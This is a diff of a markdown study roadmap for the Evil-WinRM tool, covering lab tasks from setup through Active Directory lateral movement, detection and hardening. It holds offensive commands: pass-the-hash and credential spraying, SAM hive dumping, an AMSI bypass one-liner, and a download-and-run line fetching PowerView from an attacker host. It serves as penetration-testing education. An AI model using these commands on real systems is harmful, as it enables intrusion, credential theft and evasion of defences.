@@ -21,7 +21,7 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]] · [[Cyber-Security/Lab/Metasploitable_2/TASK_LIST|🐧 Metasploitable 2 Lab]]
 
 | Recon & Scanning | Exploitation | Post-Exploitation | AD Attacks |
-|:-----------------|:-------------|:------------------|:-----------|
+| :----------------- | :------------- | :------------------ | :----------- |
 | [[Nmap\|🗺️ Nmap]] | [[Metasploit_Framework\|💀 Metasploit]] | [[LinPEAS\|🐉 LinPEAS]] | [[BloodHound\|🩸 BloodHound]] |
 | [[Netcat\|🔌 Netcat]] | [[Hydra\|🔓 Hydra]] | [[WinPEAS\|🪟 WinPEAS]] | [[Impacket\|🐍 Impacket]] |
 | [[Gobuster\|📂 Gobuster]] | **🪟 Evil-WinRM** (you are here) | [[Hashcat\|🔥 Hashcat]] | [[NetExec\|🌐 NetExec]] |
@@ -31,7 +31,7 @@
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals & WinRM Protocol | 5 | 2–3 hours |
 | 2 | Core Usage & Authentication Methods | 6 | 4–5 hours |
 | 3 | Intermediate (Scripts, Upload/Download, AMSI) | 6 | 4–6 hours |
@@ -40,7 +40,7 @@
 | 6 | Practical Labs | 4 | 5–8 hours |
 | 7 | Methodology & Detection Awareness | 3 | 2–3 hours |
 | 8 | Mastery Challenges | 3 | 4–6 hours |
-| | **Total** | **36** | **~27–40 hours** |
+|| **Total** | **36** | **~27–40 hours** |
 
 **Prerequisites:** Valid Windows credentials (username + password or NTLM hash). Target with WinRM enabled (port 5985/5986 open). Basic PowerShell knowledge. Understanding of NTLM authentication.
 
@@ -57,7 +57,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand what WinRM is, when it is enabled by default, and what makes it useful for post-exploitation. |
 | **Skills Learned** | WinRM vs RDP vs SMB exec distinction, ports 5985 (HTTP) and 5986 (HTTPS), PowerShell remoting as the underlying technology, which Windows versions enable WinRM by default. |
 | **Practical Exercise** | On a Windows target: `winrm quickconfig` to enable WinRM. `winrm enumerate winrm/config/listener` to list listeners. From Kali: `nmap -p 5985,5986 <target>` to confirm WinRM is reachable. |
@@ -69,7 +69,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Install Evil-WinRM and verify it is working. |
 | **Skills Learned** | Ruby gem installation, version management, confirming connectivity requirements. |
 | **Practical Exercise** | `gem install evil-winrm` → `evil-winrm --version`. On Kali: `sudo apt install evil-winrm` (pre-packaged). Verify: `evil-winrm -h` shows full help with all flags. |
@@ -81,7 +81,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand the four authentication methods Evil-WinRM supports and when to use each. |
 | **Skills Learned** | Password auth (`-p`), pass-the-hash (`-H`), certificate-based auth (`-c`/`-k`), Kerberos auth (`-r`). |
 | **Practical Exercise** | Read the Evil-WinRM README. For each auth type, write a one-line command example. Understand that pass-the-hash works because WinRM uses NTLM by default. |
@@ -93,7 +93,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Identify which hosts in a network have WinRM enabled before attempting to connect. |
 | **Skills Learned** | Nmap WinRM detection, NetExec WinRM check, understanding `(Pwn3d!)` indicator. |
 | **Practical Exercise** | `nmap -p 5985,5986 --open 192.168.1.0/24` → find WinRM hosts. `nxc winrm <subnet> -u user -p pass` → NetExec shows `(Pwn3d!)` if the user can connect via WinRM (member of Remote Management Users or Administrators). |
@@ -105,7 +105,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Establish your first Evil-WinRM shell using password credentials. |
 | **Skills Learned** | Basic connection syntax, understanding the shell prompt, confirming you have a session. |
 | **Practical Exercise** | `evil-winrm -i <target_ip> -u <username> -p <password>`. Confirm connection: shell prompt changes to `*Evil-WinRM* PS C:\Users\username\Documents>`. Run `whoami`, `hostname`, `ipconfig`. |
@@ -123,7 +123,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Connect to a WinRM session using only an NTLM hash — no plaintext password needed. This is one of the most powerful lateral movement techniques in AD environments. |
 | **Skills Learned** | NTLM hash authentication, extracting NT hash from secretsdump or Hashcat output, `-H` flag usage. |
 | **Practical Exercise** | After obtaining hashes via `impacket-secretsdump` or Responder+Hashcat: extract the NT portion (the 32-char hex after the colon in `LM:NT`). `evil-winrm -i <target> -u Administrator -H <NT_hash>`. |
@@ -135,7 +135,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Transfer files between your attack machine and the target using Evil-WinRM's built-in upload/download commands. |
 | **Skills Learned** | `upload`, `download` commands, transferring tools (WinPEAS, SharpHound, custom scripts) to target, exfiltrating loot (SAM, NTDS.dit, documents) back to your machine. |
 | **Practical Exercise** | Inside WinRM shell: `upload /home/kali/SharpHound.exe C:\Windows\Temp\SharpHound.exe`. Run it: `.\SharpHound.exe -c All`. Download output: `download C:\Windows\Temp\20240101_BloodHound.zip /home/kali/loot/`. |
@@ -147,7 +147,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Load PowerShell scripts directly into memory without writing them to disk — evading file-based AV detection. |
 | **Skills Learned** | `-s` flag for script directory, loading PowerView, PowerSploit, or custom scripts; understanding why in-memory execution is stealthier than disk execution. |
 | **Practical Exercise** | `evil-winrm -i <target> -u user -p pass -s /home/kali/scripts/`. Inside the shell, tab-complete to see available scripts. Type `Invoke-PowerView` (or relevant function) to load from memory. Alternatively: `IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')`. |
@@ -159,7 +159,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Execute .NET executables (like Rubeus, SharpHound, Seatbelt) directly in memory via Evil-WinRM's `-e` flag — no disk write required. |
 | **Skills Learned** | `-e` flag for executable directory, `Invoke-Binary` command, passing arguments to in-memory executables. |
 | **Practical Exercise** | `evil-winrm -i <target> -u user -p pass -e /home/kali/exe/`. Inside shell: `Invoke-Binary /home/kali/exe/Rubeus.exe asreproast` or `Invoke-Binary /home/kali/exe/Seatbelt.exe -group=all`. |
@@ -171,7 +171,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Connect over HTTPS (port 5986) using SSL to encrypt the WinRM channel. |
 | **Skills Learned** | `-S` flag for SSL, `-c`/`-k` for certificate authentication, handling self-signed certificates, when HTTPS WinRM is configured. |
 | **Practical Exercise** | `evil-winrm -i <target> -u user -p pass -S` (SSL, accept self-signed cert). For certificate auth: `evil-winrm -i <target> -c cert.pem -k key.pem -S`. |
@@ -183,7 +183,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Authenticate via Kerberos ticket (TGT/TGS) instead of password or hash — useful for Pass-the-Ticket attacks. |
 | **Skills Learned** | `-r` flag for Kerberos realm, using `KRB5CCNAME` environment variable, combining with Impacket ticket extraction or Rubeus ticket dump. |
 | **Practical Exercise** | After obtaining a TGT (via `impacket-getTGT` or `Rubeus asktgt`): `export KRB5CCNAME=/home/kali/user.ccache` → `evil-winrm -i <target_hostname> -r DOMAIN.LOCAL -u user`. Note: use hostname, not IP (Kerberos is hostname-based). |
@@ -201,7 +201,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand PowerShell execution policies and how WinRM/Evil-WinRM bypasses them by default. |
 | **Skills Learned** | Execution policy levels (Restricted, RemoteSigned, Unrestricted, Bypass), why remote PowerShell sessions run in `Bypass` mode by default, `Set-ExecutionPolicy` commands. |
 | **Practical Exercise** | In an Evil-WinRM session: `Get-ExecutionPolicy` (note the current policy — usually Bypass in remote sessions). Compare with local PowerShell: `powershell -c "Get-ExecutionPolicy"`. |
@@ -213,7 +213,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 45 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Evil-WinRM's script loading to run PowerView AD enumeration without touching disk. |
 | **Skills Learned** | PowerView functions: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`, `Find-LocalAdminAccess`, `Get-ObjectAcl`, `Invoke-ACLScanner`. |
 | **Practical Exercise** | `evil-winrm -i <DC_IP> -u user -p pass -s /home/kali/PowerSploit/Recon/`. Inside shell: `PowerView` tab-complete → `Get-NetUser -SPN` (find Kerberoastable users) → `Get-NetGroup "Domain Admins" -Recurse` → `Find-LocalAdminAccess`. |
@@ -225,7 +225,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Bypass Windows AMSI (Antimalware Scan Interface) to load offensive PowerShell tools that would otherwise be detected and blocked. |
 | **Skills Learned** | How AMSI works (hooks `AmsiScanBuffer` in `amsi.dll`), common AMSI bypass techniques (memory patching, reflection, obfuscation), using pre-built bypass snippets. |
 | **Practical Exercise** | In Evil-WinRM session, paste a known AMSI bypass one-liner (patching `amsi.dll` in memory). Example pattern (obfuscate for your engagement): `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`. Then load PowerView — should no longer be blocked. |
@@ -237,7 +237,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Perform host and AD enumeration using only native Windows commands — no extra tools needed, lower AV footprint. |
 | **Skills Learned** | `net user /domain`, `net group "Domain Admins" /domain`, `net localgroup Administrators`, `systeminfo`, `whoami /all`, `reg query`, `ipconfig /all`, `netstat -an`. |
 | **Practical Exercise** | In Evil-WinRM session: `whoami /all` (privileges + group membership) → `net user /domain` → `net group "Domain Admins" /domain` → `systeminfo | findstr /i "domain"` → `netstat -an | findstr LISTENING`. |
@@ -249,7 +249,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 45 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Upload WinPEAS via Evil-WinRM and run it to identify Windows privilege escalation vectors. |
 | **Skills Learned** | WinPEAS upload workflow, interpreting WinPEAS output, identifying high-value findings (unquoted service paths, weak permissions, stored credentials, autologon). |
 | **Practical Exercise** | `upload /home/kali/WinPEAS.exe C:\Windows\Temp\wp.exe` → `C:\Windows\Temp\wp.exe` → pipe output to file: `C:\Windows\Temp\wp.exe | Out-File C:\Windows\Temp\wp_out.txt` → `download C:\Windows\Temp\wp_out.txt`. |
@@ -261,7 +261,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand what Windows event logs capture about WinRM connections — know your detection footprint. |
 | **Skills Learned** | Event ID 4624 (logon) with Logon Type 3 (network), Event ID 4625 (failed logon), WinRM-specific logs in `Microsoft-Windows-WinRM/Operational`, PowerShell Script Block Logging (Event ID 4104). |
 | **Practical Exercise** | After connecting, on the target: `Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 10 | Format-List`. Note the connection event. Check: `Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select -First 5`. |
@@ -279,7 +279,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use NetExec to identify WinRM-accessible machines with valid credentials, then pivot to Evil-WinRM for a full interactive shell. |
 | **Skills Learned** | `nxc winrm` module, `(Pwn3d!)` indicator, credential spraying across multiple hosts, chaining discovery → shell. |
 | **Practical Exercise** | `nxc winrm 192.168.1.0/24 -u Administrator -p 'Password123'` → hosts showing `(Pwn3d!)` are WinRM-accessible. For each: `evil-winrm -i <host> -u Administrator -p 'Password123'`. |
@@ -291,7 +291,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Build a full PTH lateral movement chain: dump hashes → spray across network → shell on target. |
 | **Skills Learned** | `impacket-secretsdump` → NT hash extraction → `nxc winrm` PTH spray → `evil-winrm -H` shell. |
 | **Practical Exercise** | `impacket-secretsdump domain/user:pass@dc01` → copy NT hash of Administrator → `nxc winrm 192.168.1.0/24 -u Administrator -H <NT_hash>` → identify `(Pwn3d!)` hosts → `evil-winrm -i <target> -u Administrator -H <NT_hash>`. |
@@ -303,7 +303,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Evil-WinRM to deliver and execute SharpHound for BloodHound data collection from within the network. |
 | **Skills Learned** | SharpHound collection methods, `-c All` flag, output ZIP retrieval, feeding data to BloodHound CE. |
 | **Practical Exercise** | `upload /home/kali/SharpHound.exe C:\Windows\Temp\sh.exe` → `C:\Windows\Temp\sh.exe -c All --outputdirectory C:\Windows\Temp\` → `download C:\Windows\Temp\<date>_BloodHound.zip /home/kali/loot/` → import to BloodHound CE. |
@@ -315,7 +315,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Dump Windows SAM and SYSTEM hives via an Evil-WinRM session and extract local account hashes offline. |
 | **Skills Learned** | `reg save HKLM\SAM`, `reg save HKLM\SYSTEM`, `reg save HKLM\SECURITY` commands, downloading hive files, offline extraction with `impacket-secretsdump`. |
 | **Practical Exercise** | In Evil-WinRM (as Administrator): `reg save HKLM\SAM C:\Windows\Temp\sam.hive` → `reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive` → `download C:\Windows\Temp\sam.hive` → `download C:\Windows\Temp\sys.hive` → `impacket-secretsdump -sam sam.hive -system sys.hive LOCAL`. |
@@ -327,7 +327,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 50 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand how to operate effectively in an Evil-WinRM session when Windows Defender or EDR is active. |
 | **Skills Learned** | AMSI bypass (Task 3.3), disabling Defender temporarily (if admin), using `-e` for in-memory .NET execution, obfuscating uploaded files, using LOLBins (Living Off the Land Binaries). |
 | **Practical Exercise** | Try uploading a known offensive tool (e.g., Mimikatz) — observe Defender quarantine. Then: (1) use AMSI bypass + in-memory execution. (2) Alternatively use LOLBins: `wmic`, `rundll32`, `regsvr32` for post-exploitation without custom tools. |
@@ -345,7 +345,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use NetExec as the discovery and credential-spray layer, then hand off to Evil-WinRM for interactive access. |
 | **Practical Exercise** | `nxc winrm <subnet> -u users.txt -p passwords.txt` → collect `(Pwn3d!)` results → automate Evil-WinRM connection for each valid combination. |
 | **Expected Output** | Multi-host credential spray results. Interactive shell on each accessible host. |
@@ -355,7 +355,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Chain Impacket secretsdump output directly into Evil-WinRM pass-the-hash sessions. |
 | **Practical Exercise** | `impacket-secretsdump` output → parse NT hashes → `evil-winrm -i <target> -u <user> -H <NT_hash>` for each account. |
 | **Expected Output** | Working PTH sessions from secretsdump output. Admin shell on multiple machines from a single hash dump. |
@@ -365,7 +365,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use a BloodHound attack path to navigate through multiple Evil-WinRM sessions to reach Domain Admin. |
 | **Practical Exercise** | BloodHound shows path: UserA → GenericAll → UserB → AdminTo → Server01 → Server01 has DCSync rights. Follow each hop: Evil-WinRM as UserA → reset UserB password → Evil-WinRM as UserB → DCSync via Impacket. |
 | **Expected Output** | Successful Domain Admin compromise following a multi-hop BloodHound path. |
@@ -375,7 +375,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Hashcat cracked passwords to authenticate with Evil-WinRM. |
 | **Practical Exercise** | Hashcat cracks `P@ssw0rd1` from NTLM hash → `evil-winrm -i <target> -u <user> -p 'P@ssw0rd1'`. Compare with direct PTH (`-H`) — both work. Know when plaintext is needed vs when hash suffices. |
 | **Expected Output** | Shell via cracked password. Understanding of when to crack vs when to PTH. |
@@ -391,7 +391,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 3–4 hours
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scenario** | HackTheBox machine "Forest" — a domain controller with AS-REP Roasting, DCSync, and WinRM access. Classic Evil-WinRM lab. |
 | **Tools Needed** | Kerbrute → Impacket GetNPUsers → Hashcat → Evil-WinRM → BloodHound → WriteDACL abuse → DCSync |
 | **Success Criteria** | Root flag obtained via Domain Admin shell through Evil-WinRM. Full attack chain documented. |
@@ -401,7 +401,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 2–3 hours
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scenario** | HackTheBox "Active" — SMB share → GPP credentials → Kerberoasting → Administrator shell via Evil-WinRM. |
 | **Tools Needed** | Nmap → SMBclient → Impacket GetUserSPNs → Hashcat → Evil-WinRM |
 | **Success Criteria** | Administrator shell via Evil-WinRM after cracking Kerberoast hash. |
@@ -411,7 +411,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 2–3 hours
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scenario** | Home lab with Windows Server DC + 2 Windows 10 workstations. Obtain hash on one workstation, use PTH to Evil-WinRM into the DC. |
 | **Tools Needed** | NetExec → Responder → Hashcat → Evil-WinRM PTH |
 | **Success Criteria** | Shell on DC via PTH without ever cracking the plaintext password. |
@@ -421,7 +421,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 2 hours
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scenario** | THM guided AD room covering Kerbrute enumeration, AS-REP Roasting, Impacket, and Evil-WinRM shell access. |
 | **Tools Needed** | Kerbrute → Impacket → Hashcat → Evil-WinRM |
 | **Success Criteria** | All THM tasks completed. Evil-WinRM session established on the target. |
@@ -437,7 +437,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Place Evil-WinRM correctly in the full AD attack kill chain. |
 | **Skills Learned** | Kill chain positioning: Enumeration (Nmap/NetExec) → Credential Access (Responder/Impacket/Hashcat) → **Lateral Movement (Evil-WinRM)** → Escalation (BloodHound/WinPEAS) → Persistence/Exfil. |
 | **Practical Exercise** | Draw the full AD attack chain. Mark each tool. Identify where Evil-WinRM sits (lateral movement / interactive access layer). |
@@ -448,7 +448,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand how blue teams detect Evil-WinRM usage. |
 | **Skills Learned** | Event ID 4624 Logon Type 3 (network logon), WinRM operational log, PowerShell Script Block Logging (Event 4104), SIEM rules for WinRM lateral movement, network detection (port 5985 connections from non-admin workstations). |
 | **Practical Exercise** | Review Windows event logs after a test connection. Identify what a defender would see in a SIEM. Write a detection rule: "Alert on WinRM connections (port 5985) from non-IT workstations during business hours." |
@@ -459,7 +459,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Know how to harden WinRM to prevent unauthorized access — from the defender perspective. |
 | **Skills Learned** | Restrict WinRM access via firewall rules, use Windows Firewall to limit port 5985/5986 to management subnets only, enable PowerShell Script Block Logging, use JEA (Just Enough Administration) to limit remote session capabilities, use 5986 (HTTPS) only. |
 | **Expected Output** | WinRM hardening checklist. Understanding that Evil-WinRM is only effective against improperly configured or unmonitored WinRM. |
@@ -493,19 +493,19 @@ Build a home AD lab (1 DC + 2 workstations). Starting from only network access a
 ## 🎓 Competency Matrix
 
 | Skill | Beginner | Intermediate | Advanced |
-|:------|:--------:|:------------:|:--------:|
-| Basic password shell connection | [ ] | | |
-| Pass-the-hash authentication | | [ ] | |
-| File upload / download | [ ] | | |
-| In-memory script loading (`-s`) | | [ ] | |
-| In-memory .NET execution (`-e`) | | [ ] | |
-| AMSI bypass | | | [ ] |
-| SSL / HTTPS mode | [ ] | | |
-| Kerberos ticket auth | | [ ] | |
-| NetExec → Evil-WinRM chain | | [ ] | |
-| BloodHound path → shell execution | | | [ ] |
-| SAM/SYSTEM hive extraction | | [ ] | |
-| Full AD zero-to-DA using Evil-WinRM | | | [ ] |
+| :------ | :--------: | :------------: | :--------: |
+| Basic password shell connection | [ ] |||
+| Pass-the-hash authentication || [ ] ||
+| File upload / download | [ ] |||
+| In-memory script loading (`-s`) || [ ] ||
+| In-memory .NET execution (`-e`) || [ ] ||
+| AMSI bypass ||| [ ] |
+| SSL / HTTPS mode | [ ] |||
+| Kerberos ticket auth || [ ] ||
+| NetExec → Evil-WinRM chain || [ ] ||
+| BloodHound path → shell execution ||| [ ] |
+| SAM/SYSTEM hive extraction || [ ] ||
+| Full AD zero-to-DA using Evil-WinRM ||| [ ] |
 
 ---
 
